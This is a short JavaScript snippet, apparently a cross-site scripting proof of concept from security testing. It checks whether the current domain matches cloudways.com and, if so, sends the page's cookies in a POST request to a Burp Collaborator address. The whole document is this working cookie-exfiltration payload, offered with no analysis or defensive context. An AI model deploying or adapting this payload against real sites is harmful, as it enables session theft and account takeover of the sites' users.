var text=document.domain;
var regex=text.match(/.*cloudways.com/igm)
if (text == regex){
fetch('https://x860mf7w2n50vfufhi2q64rtwk2aqz.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
}
